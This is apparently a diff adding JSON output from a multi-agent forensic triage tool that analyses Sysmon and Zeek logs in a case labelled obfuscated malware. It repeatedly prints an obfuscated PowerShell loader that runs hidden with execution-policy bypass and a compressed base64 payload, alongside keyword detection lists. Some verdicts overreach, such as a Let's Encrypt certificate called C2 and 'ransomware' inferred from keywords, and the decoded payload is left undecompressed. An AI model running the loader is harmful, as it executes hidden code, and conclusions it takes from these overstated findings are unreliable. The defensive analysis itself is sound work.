+            "zeek_network.json"
+          ],
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+          "agent": "TriageAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:49.918575+00:00",
+          "traceable": true
+        },
+        {
+          "type": "dynamic_priority_escalation",
+          "reason": "Critical keywords found in evidence",
+          "keywords": [
+            "powershell",
+            "executionpolicy bypass",
+            "windowstyle hidden",
+            "base64",
+            "0x1fffff"
+          ],
+          "artifact": "triage_scan",
+          "priority_set": "CRITICAL",
+          "agent": "TriageAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:49.919603+00:00",
+          "traceable": true
+        }
+      ],
+      "errors": [],
+      "timestamp": "2026-05-23T02:57:49.919791+00:00"
+    },
+    "log_analysis": {
+      "status": "COMPLETE",
+      "agent": "LogAgent",
+      "log_files_analyzed": 6,
+      "suspicious_files": 3,
+      "hits": {
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json": {
+          "powershell": {
+            "matches": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"$e=env:public[13]+env:public[14]+'x';Set-Alias -Name r -Value $e; r (New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('K8jcSMwtyEnVS8/IzMlJTE7VyyxJ1UtJ0UvOT0lN1stNzMzRy0rMK00tSdWrzc1N1kvOz9UrycxN1StPLEnVS8vM0yvJyCXJ6F4A'),[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()\""
+            ],
+            "count": 2,
+            "source_file": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+            "file_hash": "619304a909d0de97",
+            "tool_used": "json_parser"
+          },
+          "base64": {
+            "matches": [
+              "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"$e=env:public[13]+env:public[14]+'x';Set-Alias -Name r -Value $e; r (New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('K8jcSMwtyEnVS8/IzMlJTE7VyyxJ1UtJ0UvOT0lN1stNzMzRy0rMK00tSdWrzc1N1kvOz9UrycxN1StPLEnVS8vM0yvJyCXJ6F4A'),[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()\""
+            ],
+            "count": 1,
+            "source_file": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+            "file_hash": "619304a909d0de97",
+            "tool_used": "json_parser"
+          },
+          "executionpolicy": {
+            "matches": [
+              "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"$e=env:public[13]+env:public[14]+'x';Set-Alias -Name r -Value $e; r (New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('K8jcSMwtyEnVS8/IzMlJTE7VyyxJ1UtJ0UvOT0lN1stNzMzRy0rMK00tSdWrzc1N1kvOz9UrycxN1StPLEnVS8vM0yvJyCXJ6F4A'),[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()\""
+            ],
+            "count": 1,
+            "source_file": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+            "file_hash": "619304a909d0de97",
+            "tool_used": "json_parser"
+          },
+          "windowstyle": {
+            "matches": [
+              "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"$e=env:public[13]+env:public[14]+'x';Set-Alias -Name r -Value $e; r (New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('K8jcSMwtyEnVS8/IzMlJTE7VyyxJ1UtJ0UvOT0lN1stNzMzRy0rMK00tSdWrzc1N1kvOz9UrycxN1StPLEnVS8vM0yvJyCXJ6F4A'),[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()\""
+            ],
+            "count": 1,
+            "source_file": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+            "file_hash": "619304a909d0de97",
+            "tool_used": "json_parser"
+          },
+          "hidden": {
+            "matches": [
+              "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"$e=env:public[13]+env:public[14]+'x';Set-Alias -Name r -Value $e; r (New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('K8jcSMwtyEnVS8/IzMlJTE7VyyxJ1UtJ0UvOT0lN1stNzMzRy0rMK00tSdWrzc1N1kvOz9UrycxN1StPLEnVS8vM0yvJyCXJ6F4A'),[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()\""
+            ],
+            "count": 1,
+            "source_file": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+            "file_hash": "619304a909d0de97",
+            "tool_used": "json_parser"
+          },
+          "bypass": {
+            "matches": [
+              "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"$e=env:public[13]+env:public[14]+'x';Set-Alias -Name r -Value $e; r (New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('K8jcSMwtyEnVS8/IzMlJTE7VyyxJ1UtJ0UvOT0lN1stNzMzRy0rMK00tSdWrzc1N1kvOz9UrycxN1StPLEnVS8vM0yvJyCXJ6F4A'),[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()\""
+            ],
+            "count": 1,
+            "source_file": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+            "file_hash": "619304a909d0de97",
+            "tool_used": "json_parser"
+          },
+          "wmi": {
+            "matches": [
+              "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"
+            ],
+            "count": 1,
+            "source_file": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+            "file_hash": "619304a909d0de97",
+            "tool_used": "json_parser"
+          }
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json": {
+          "powershell": {
+            "matches": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+            ],
+            "count": 2,
+            "source_file": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json",
+            "file_hash": "670fa5d537a5337b",
+            "tool_used": "json_parser"
+          },
+          "0x1fffff": {
+            "matches": [
+              "0x1FFFFF"
+            ],
+            "count": 1,
+            "source_file": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json",
+            "file_hash": "670fa5d537a5337b",
+            "tool_used": "json_parser"
+          },
+          "svchost": {
+            "matches": [
+              "C:\\Windows\\System32\\svchost.exe",
+              "C:\\Windows\\System32\\svchost.exe"
+            ],
+            "count": 2,
+            "source_file": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json",
+            "file_hash": "670fa5d537a5337b",
+            "tool_used": "json_parser"
+          }
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json": {
+          "let's encrypt": {
+            "matches": [
+              "CN=Let's Encrypt Authority X3, O=Let's Encrypt, C=US"
+            ],
+            "count": 1,
+            "source_file": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json",
+            "file_hash": "a1f2ebf54ab8ff40",
+            "tool_used": "json_parser"
+          }
+        }
+      },
+      "extracted_iocs": {
+        "ipv4_addresses": [
+          "104.21.55.12",
+          "192.168.1.105"
+        ],
+        "sha256_hashes": [],
+        "md5_hashes": [],
+        "base64_strings": [
+          "K8jcSMwtyEnVS8/IzMlJTE7VyyxJ1UtJ0UvOT0lN1stNzMzRy0..."
+        ],
+        "decoded_payloads": [],
+        "file_paths": [],
+        "hostnames": [
+          "A1B2C3D4-E5F6",
+          "DESKTOP-DEV",
+          "DESKTOP-DEV-99A"
+        ],
+        "usernames": [],
+        "process_ids": [
+          "1128",
+          "4192",
+          "912"
+        ],
+        "granted_access": [
+          "0x1FFFFF"
+        ]
+      },
+      "unique_ips": [
+        "104.21.55.12",
+        "192.168.1.105"
+      ],
+      "chain_of_custody": {
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json": {
+          "sha256": "619304a909d0de9741ac108a2ac53e2d366788677f5f7b66c59bdd492bb6a786",
+          "timestamp": "2026-05-23T02:57:49.985015+00:00",
+          "size_bytes": 914
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log": {
+          "sha256": "619304a909d0de9741ac108a2ac53e2d366788677f5f7b66c59bdd492bb6a786",
+          "timestamp": "2026-05-23T02:57:50.504988+00:00",
+          "size_bytes": 914
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json": {
+          "sha256": "670fa5d537a5337b60c444b935c93dbcb1129f404bcd8fef7d95d15b19246d00",
+          "timestamp": "2026-05-23T02:57:50.804210+00:00",
+          "size_bytes": 915
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.log": {
+          "sha256": "670fa5d537a5337b60c444b935c93dbcb1129f404bcd8fef7d95d15b19246d00",
+          "timestamp": "2026-05-23T02:57:51.105462+00:00",
+          "size_bytes": 915
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json": {
+          "sha256": "a1f2ebf54ab8ff4069e38a67cf5e34e1fcec121526753060a5dc2fbcee5fbea1",
+          "timestamp": "2026-05-23T02:57:51.420449+00:00",
+          "size_bytes": 1188
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.log": {
+          "sha256": "a1f2ebf54ab8ff4069e38a67cf5e34e1fcec121526753060a5dc2fbcee5fbea1",
+          "timestamp": "2026-05-23T02:57:51.735656+00:00",
+          "size_bytes": 1188
+        }
+      },
+      "decoded_payloads": [
+        {
+          "original": "K8jcSMwtyEnVS8/IzMlJTE7VyyxJ1UtJ0UvOT0lN1stNzMzRy0rMK00tSdWr...",
+          "decoded_text": "+\ufffd\ufffdH\ufffd-\ufffdI\ufffdK\ufffd\ufffd\ufffd\ufffdILN\ufffd\ufffd,I\ufffdKI\ufffdK\ufffdOIM\ufffd\ufffdM\ufffd\ufffd\ufffd\ufffdJ\ufffd+M-I\u056b\ufffd\ufffdM\ufffdK\ufffd\ufffd\ufffd+\ufffd\ufffdM\ufffd+O,I\ufffdK\ufffd\ufffd\ufffd+\ufffd\ufffd%\ufffd\ufffd^\u0000",
+          "is_compressed": false,
+          "extracted_strings": [],
+          "suspicious_indicators": []
+        },
+        {
+          "original": "K8jcSMwtyEnVS8/IzMlJTE7VyyxJ1UtJ0UvOT0lN1stNzMzRy0rMK00tSdWr...",
+          "decoded_text": "+\ufffd\ufffdH\ufffd-\ufffdI\ufffdK\ufffd\ufffd\ufffd\ufffdILN\ufffd\ufffd,I\ufffdKI\ufffdK\ufffdOIM\ufffd\ufffdM\ufffd\ufffd\ufffd\ufffdJ\ufffd+M-I\u056b\ufffd\ufffdM\ufffdK\ufffd\ufffd\ufffd+\ufffd\ufffdM\ufffd+O,I\ufffdK\ufffd\ufffd\ufffd+\ufffd\ufffd%\ufffd\ufffd^\u0000",
+          "is_compressed": false,
+          "extracted_strings": [],
+          "suspicious_indicators": []
+        }
+      ],
+      "findings": [
+        {
+          "type": "suspicious_log_activity",
+          "file": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+          "file_hash": "619304a909d0de9741ac108a2ac53e2d366788677f5f7b66c59bdd492bb6a786",
+          "keywords_matched": [
+            "powershell",
+            "base64",
+            "executionpolicy",
+            "windowstyle",
+            "hidden",
+            "bypass",
+            "wmi"
+          ],
+          "total_hits": 8,
+          "agent": "LogAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:50.504653+00:00",
+          "traceable": true
+        },
+        {
+          "type": "suspicious_log_activity",
+          "file": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json",
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json",
+          "file_hash": "670fa5d537a5337b60c444b935c93dbcb1129f404bcd8fef7d95d15b19246d00",
+          "keywords_matched": [
+            "powershell",
+            "0x1fffff",
+            "svchost"
+          ],
+          "total_hits": 5,
+          "agent": "LogAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:51.104947+00:00",
+          "traceable": true
+        },
+        {
+          "type": "suspicious_log_activity",
+          "file": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json",
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json",
+          "file_hash": "a1f2ebf54ab8ff4069e38a67cf5e34e1fcec121526753060a5dc2fbcee5fbea1",
+          "keywords_matched": [
+            "let's encrypt"
+          ],
+          "total_hits": 1,
+          "agent": "LogAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:51.735080+00:00",
+          "traceable": true
+        }
+      ],
+      "errors": [],
+      "timestamp": "2026-05-23T02:57:52.044617+00:00"
+    },
+    "disk_analysis": {
+      "status": "COMPLETE",
+      "agent": "DiskAgent",
+      "files_analyzed": 6,
+      "total_hits": 0,
+      "priority": "LOW",
+      "extracted_iocs": {
+        "suspicious_executables": [],
+        "drop_zone_paths": [],
+        "persistence_paths": [],
+        "double_extension_files": [],
+        "malicious_filenames": []
+      },
+      "chain_of_custody": {
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json": {
+          "sha256": "619304a909d0de9741ac108a2ac53e2d366788677f5f7b66c59bdd492bb6a786",
+          "timestamp": "2026-05-23T02:57:52.051749+00:00",
+          "size_bytes": 914
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log": {
+          "sha256": "619304a909d0de9741ac108a2ac53e2d366788677f5f7b66c59bdd492bb6a786",
+          "timestamp": "2026-05-23T02:57:52.053790+00:00",
+          "size_bytes": 914
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json": {
+          "sha256": "670fa5d537a5337b60c444b935c93dbcb1129f404bcd8fef7d95d15b19246d00",
+          "timestamp": "2026-05-23T02:57:52.055345+00:00",
+          "size_bytes": 915
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.log": {
+          "sha256": "670fa5d537a5337b60c444b935c93dbcb1129f404bcd8fef7d95d15b19246d00",
+          "timestamp": "2026-05-23T02:57:52.056625+00:00",
+          "size_bytes": 915
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json": {
+          "sha256": "a1f2ebf54ab8ff4069e38a67cf5e34e1fcec121526753060a5dc2fbcee5fbea1",
+          "timestamp": "2026-05-23T02:57:52.057924+00:00",
+          "size_bytes": 1188
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.log": {
+          "sha256": "a1f2ebf54ab8ff4069e38a67cf5e34e1fcec121526753060a5dc2fbcee5fbea1",
+          "timestamp": "2026-05-23T02:57:52.059190+00:00",
+          "size_bytes": 1188
+        }
+      },
+      "findings": [],
+      "errors": [],
+      "timestamp": "2026-05-23T02:57:52.060405+00:00"
+    },
+    "memory_analysis": {
+      "status": "COMPLETE",
+      "agent": "MemoryAgent",
+      "files_analyzed": 6,
+      "total_hits": 2,
+      "priority": "HIGH",
+      "extracted_iocs": {
+        "injection_techniques": [],
+        "credential_dump_indicators": [],
+        "suspicious_process_pairs": [
+          "wmiprvse.exe -> powershell.exe"
+        ],
+        "hollowing_indicators": [],
+        "memory_anomalies": []
+      },
+      "chain_of_custody": {
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json": {
+          "sha256": "619304a909d0de9741ac108a2ac53e2d366788677f5f7b66c59bdd492bb6a786",
+          "timestamp": "2026-05-23T02:57:52.064248+00:00",
+          "size_bytes": 914
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log": {
+          "sha256": "619304a909d0de9741ac108a2ac53e2d366788677f5f7b66c59bdd492bb6a786",
+          "timestamp": "2026-05-23T02:57:52.064759+00:00",
+          "size_bytes": 914
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json": {
+          "sha256": "670fa5d537a5337b60c444b935c93dbcb1129f404bcd8fef7d95d15b19246d00",
+          "timestamp": "2026-05-23T02:57:52.065169+00:00",
+          "size_bytes": 915
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.log": {
+          "sha256": "670fa5d537a5337b60c444b935c93dbcb1129f404bcd8fef7d95d15b19246d00",
+          "timestamp": "2026-05-23T02:57:52.065505+00:00",
+          "size_bytes": 915
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json": {
+          "sha256": "a1f2ebf54ab8ff4069e38a67cf5e34e1fcec121526753060a5dc2fbcee5fbea1",
+          "timestamp": "2026-05-23T02:57:52.065898+00:00",
+          "size_bytes": 1188
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.log": {
+          "sha256": "a1f2ebf54ab8ff4069e38a67cf5e34e1fcec121526753060a5dc2fbcee5fbea1",
+          "timestamp": "2026-05-23T02:57:52.066234+00:00",
+          "size_bytes": 1188
+        }
+      },
+      "findings": [
+        {
+          "type": "suspicious_process_tree",
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+          "file_hash": "619304a909d0de97",
+          "parent": "wmiprvse.exe",
+          "child": "powershell.exe",
+          "pair": "wmiprvse.exe -> powershell.exe",
+          "severity": "HIGH",
+          "mitre": "T1059 - Command and Scripting Interpreter",
+          "agent": "MemoryAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.064580+00:00",
+          "traceable": true
+        },
+        {
+          "type": "suspicious_process_tree",
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log",
+          "file_hash": "619304a909d0de97",
+          "parent": "wmiprvse.exe",
+          "child": "powershell.exe",
+          "pair": "wmiprvse.exe -> powershell.exe",
+          "severity": "HIGH",
+          "mitre": "T1059 - Command and Scripting Interpreter",
+          "agent": "MemoryAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.065012+00:00",
+          "traceable": true
+        }
+      ],
+      "errors": [],
+      "timestamp": "2026-05-23T02:57:52.066551+00:00"
+    },
+    "network_analysis": {
+      "status": "COMPLETE",
+      "agent": "NetworkAgent",
+      "files_analyzed": 6,
+      "total_hits": 2,
+      "priority": "HIGH",
+      "extracted_iocs": {
+        "c2_indicators": [],
+        "suspicious_ips": [],
+        "suspicious_ports": [],
+        "dns_tunnel_indicators": [],
+        "exfil_indicators": [],
+        "scan_indicators": [],
+        "tls_anomalies": [
+          "let's encrypt"
+        ],
+        "long_subdomains": []
+      },
+      "chain_of_custody": {
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json": {
+          "sha256": "619304a909d0de9741ac108a2ac53e2d366788677f5f7b66c59bdd492bb6a786",
+          "timestamp": "2026-05-23T02:57:52.069252+00:00",
+          "size_bytes": 914
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log": {
+          "sha256": "619304a909d0de9741ac108a2ac53e2d366788677f5f7b66c59bdd492bb6a786",
+          "timestamp": "2026-05-23T02:57:52.070387+00:00",
+          "size_bytes": 914
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json": {
+          "sha256": "670fa5d537a5337b60c444b935c93dbcb1129f404bcd8fef7d95d15b19246d00",
+          "timestamp": "2026-05-23T02:57:52.071331+00:00",
+          "size_bytes": 915
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.log": {
+          "sha256": "670fa5d537a5337b60c444b935c93dbcb1129f404bcd8fef7d95d15b19246d00",
+          "timestamp": "2026-05-23T02:57:52.072258+00:00",
+          "size_bytes": 915
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json": {
+          "sha256": "a1f2ebf54ab8ff4069e38a67cf5e34e1fcec121526753060a5dc2fbcee5fbea1",
+          "timestamp": "2026-05-23T02:57:52.073192+00:00",
+          "size_bytes": 1188
+        },
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.log": {
+          "sha256": "a1f2ebf54ab8ff4069e38a67cf5e34e1fcec121526753060a5dc2fbcee5fbea1",
+          "timestamp": "2026-05-23T02:57:52.074577+00:00",
+          "size_bytes": 1188
+        }
+      },
+      "findings": [
+        {
+          "type": "tls_anomaly",
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json",
+          "file_hash": "a1f2ebf54ab8ff40",
+          "indicator": "let's encrypt",
+          "evidence": [
+            "\"issuer\": \"CN=Let's Encrypt Authority X3, O=Let's Encrypt, C=US\","
+          ],
+          "severity": "HIGH",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "agent": "NetworkAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.074401+00:00",
+          "traceable": true
+        },
+        {
+          "type": "tls_anomaly",
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.log",
+          "file_hash": "a1f2ebf54ab8ff40",
+          "indicator": "let's encrypt",
+          "evidence": [
+            "\"issuer\": \"CN=Let's Encrypt Authority X3, O=Let's Encrypt, C=US\","
+          ],
+          "severity": "HIGH",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "agent": "NetworkAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.075741+00:00",
+          "traceable": true
+        }
+      ],
+      "errors": [],
+      "timestamp": "2026-05-23T02:57:52.075869+00:00"
+    },
+    "correlation": {
+      "status": "COMPLETE",
+      "agent": "CorrelationAgent",
+      "agents_correlated": 5,
+      "extracted_entities": {
+        "ipv4_addresses": [
+          "104.21.55.12",
+          "192.168.1.105"
+        ],
+        "sha256_hashes": [],
+        "md5_hashes": [],
+        "base64_strings": [
+          "K8jcSMwtyEnVS8/IzMlJTE7VyyxJ1UtJ0UvOT0lN1stNzMzRy0..."
+        ],
+        "decoded_payloads": [],
+        "file_paths": [],
+        "hostnames": [
+          "A1B2C3D4-E5F6",
+          "DESKTOP-DEV",
+          "DESKTOP-DEV-99A"
+        ],
+        "usernames": [],
+        "process_ids": [
+          "1128",
+          "4192",
+          "912"
+        ],
+        "granted_access": [
+          "0x1FFFFF"
+        ],
+        "domains": []
+      },
+      "ip_correlations": [
+        {
+          "type": "ip_seen_in_evidence",
+          "ip": "104.21.55.12",
+          "seen_by_agents": [
+            "LogAgent"
+          ],
+          "significance": "HIGH",
+          "description": "Regex-verified IoC: 104.21.55.12",
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.083246+00:00",
+          "traceable": true
+        },
+        {
+          "type": "ip_seen_in_evidence",
+          "ip": "192.168.1.105",
+          "seen_by_agents": [
+            "LogAgent"
+          ],
+          "significance": "HIGH",
+          "description": "Regex-verified IoC: 192.168.1.105",
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.083255+00:00",
+          "traceable": true
+        }
+      ],
+      "attack_patterns": [
+        {
+          "type": "attack_pattern",
+          "pattern": "RANSOMWARE_OR_MALWARE",
+          "confidence": "CRITICAL",
+          "evidence_keywords": [
+            "powershell",
+            "base64"
+          ],
+          "description": "Malware or ransomware execution detected",
+          "mitre_technique": "T1486 - Data Encrypted for Impact",
+          "base_score": 90,
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.082949+00:00",
+          "traceable": true
+        },
+        {
+          "type": "attack_pattern",
+          "pattern": "PROCESS_INJECTION",
+          "confidence": "CRITICAL",
+          "evidence_keywords": [
+            "0x1FFFFF"
+          ],
+          "description": "Process injection confirmed via GrantedAccess=0x1FFFFF",
+          "mitre_technique": "T1055 - Process Injection",
+          "base_score": 97,
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.083035+00:00",
+          "traceable": true
+        },
+        {
+          "type": "attack_pattern",
+          "pattern": "POWERSHELL_OBFUSCATION",
+          "confidence": "CRITICAL",
+          "evidence_keywords": [
+            "hidden",
+            "windowstyle",
+            "executionpolicy",
+            "bypass"
+          ],
+          "description": "Obfuscated PowerShell execution with stealth flags",
+          "mitre_technique": "T1059.001 - PowerShell / T1027 - Obfuscation",
+          "base_score": 90,
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.083093+00:00",
+          "traceable": true
+        }
+      ],
+      "temporal_sequences": [
+        {
+          "type": "temporal_sequence",
+          "pattern": "FULL_INJECTION_CHAIN",
+          "confidence": "CRITICAL",
+          "description": "Execution -> Process Injection -> Remote Thread -> C2 Beacon within time window",
+          "mitre_technique": "T1055 - Process Injection / T1071 - C2 Communication",
+          "events": [
+            "EventID:1 Process Execution",
+            "EventID:10 Process Access",
+            "EventID:8 Remote Thread Creation",
+            "Network C2 Beacon"
+          ],
+          "base_score": 97,
+          "multiplier": 3.5,
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.083127+00:00",
+          "traceable": true
+        },
+        {
+          "type": "temporal_sequence",
+          "pattern": "FULL_INJECTION_CHAIN",
+          "confidence": "CRITICAL",
+          "description": "Execution -> Process Injection -> Remote Thread -> C2 Beacon within time window",
+          "mitre_technique": "T1055 - Process Injection / T1071 - C2 Communication",
+          "events": [
+            "EventID:1 Process Execution",
+            "EventID:10 Process Access",
+            "EventID:8 Remote Thread Creation",
+            "Network C2 Beacon"
+          ],
+          "base_score": 97,
+          "multiplier": 3.5,
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.083158+00:00",
+          "traceable": true
+        },
+        {
+          "type": "temporal_sequence",
+          "pattern": "FULL_INJECTION_CHAIN",
+          "confidence": "CRITICAL",
+          "description": "Execution -> Process Injection -> Remote Thread -> C2 Beacon within time window",
+          "mitre_technique": "T1055 - Process Injection / T1071 - C2 Communication",
+          "events": [
+            "EventID:1 Process Execution",
+            "EventID:10 Process Access",
+            "EventID:8 Remote Thread Creation",
+            "Network C2 Beacon"
+          ],
+          "base_score": 97,
+          "multiplier": 3.5,
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.083190+00:00",
+          "traceable": true
+        },
+        {
+          "type": "temporal_sequence",
+          "pattern": "FULL_INJECTION_CHAIN",
+          "confidence": "CRITICAL",
+          "description": "Execution -> Process Injection -> Remote Thread -> C2 Beacon within time window",
+          "mitre_technique": "T1055 - Process Injection / T1071 - C2 Communication",
+          "events": [
+            "EventID:1 Process Execution",
+            "EventID:10 Process Access",
+            "EventID:8 Remote Thread Creation",
+            "Network C2 Beacon"
+          ],
+          "base_score": 97,
+          "multiplier": 3.5,
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.083222+00:00",
+          "traceable": true
+        }
+      ],
+      "high_signal_signatures": [
+        {
+          "values": [
+            "0x1fffff",
+            "0x1FFFFF"
+          ],
+          "description": "PROCESS_ALL_ACCESS on system process \u2014 definitive process injection",
+          "mitre": "T1055 - Process Injection",
+          "score": 95,
+          "triggered_by": "GrantedAccess=0x1FFFFF"
+        },
+        {
+          "keywords": [
+            "executionpolicy bypass",
+            "windowstyle hidden",
+            "-noprofile -command"
+          ],
+          "description": "PowerShell stealth execution flags \u2014 malware loader signature",
+          "mitre": "T1059.001 - PowerShell",
+          "score": 88,
+          "triggered_by": "Keywords in sysmon_execution.json"
+        },
+        {
+          "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "score": 92,
+          "triggered_by": "zeek_network.json"
+        },
+        {
+          "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "score": 92,
+          "triggered_by": "zeek_network.log"
+        },
+        {
+          "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "score": 92,
+          "triggered_by": "zeek_network.json"
+        },
+        {
+          "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "score": 92,
+          "triggered_by": "zeek_network.log"
+        },
+        {
+          "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "score": 92,
+          "triggered_by": "zeek_network.json"
+        },
+        {
+          "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "score": 92,
+          "triggered_by": "zeek_network.log"
+        },
+        {
+          "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "score": 92,
+          "triggered_by": "zeek_network.json"
+        },
+        {
+          "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "score": 92,
